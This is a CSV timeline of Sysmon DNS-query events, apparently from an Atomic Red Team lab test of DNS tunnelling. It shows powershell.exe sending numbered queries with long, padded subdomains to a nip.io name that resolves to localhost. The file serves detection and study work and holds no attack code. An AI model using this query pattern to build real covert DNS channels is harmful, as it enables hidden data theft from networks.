"Timestamp","RuleTitle","Level","Computer","Channel","EventID","MitreTactics","MitreTags","OtherTags","RecordID","Details","ExtraFieldInfo","RuleFile","RuleID","EvtxFile"
"2025-12-22 14:01:33.419 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166533,"Query: 203.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteam.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:32.976","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:33.419 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166534,"Query: 204.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteama.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:33.295","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:33.419 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166535,"Query: 205.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamat.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:33.363","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:34.420 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166536,"Query: 206.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamato.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:33.408","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:34.420 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166537,"Query: 207.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatom.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:33.453","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:34.420 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166538,"Query: 208.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomi.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:33.497","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:34.421 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166539,"Query: 209.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomic.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:33.543","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:34.421 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166540,"Query: 210.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicr.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:33.588","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:34.421 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166541,"Query: 211.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicre.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:33.632","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:34.421 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166542,"Query: 212.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicred.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:33.677","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:34.421 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166543,"Query: 213.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredt.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:33.720","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:34.421 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166544,"Query: 214.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:33.762","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:34.422 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166545,"Query: 215.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.at.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:33.813","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:34.422 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166546,"Query: 216.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.ato.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:33.857","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:34.422 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166547,"Query: 217.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atom.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:34.181","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:34.422 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166548,"Query: 218.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomi.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:34.224","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:35.155 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166549,"Query: 219.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomic.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:34.399","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:35.424 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166550,"Query: 220.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicr.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:34.444","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:35.424 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166551,"Query: 221.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicre.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:34.487","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:35.425 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166552,"Query: 222.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicred.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:34.531","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:35.425 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166553,"Query: 223.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredt.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:34.575","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:35.425 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166554,"Query: 224.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredte.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:34.620","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:35.425 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166555,"Query: 225.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredtea.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:34.664","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:35.426 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166556,"Query: 226.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteam.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:34.846","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:35.426 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166557,"Query: 227.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteama.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:34.892","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:35.426 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166558,"Query: 228.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamat.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:34.936","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:35.426 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166559,"Query: 229.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamato.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:34.979","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:35.426 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166560,"Query: 230.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatom.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:35.021","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:35.427 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166561,"Query: 231.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomi.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:35.065","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:35.427 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166562,"Query: 232.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomic.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:35.109","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:35.427 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166563,"Query: 233.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicr.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:35.152","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:35.427 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166564,"Query: 234.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicre.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:35.197","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:35.427 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166565,"Query: 235.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicred.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:35.240","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
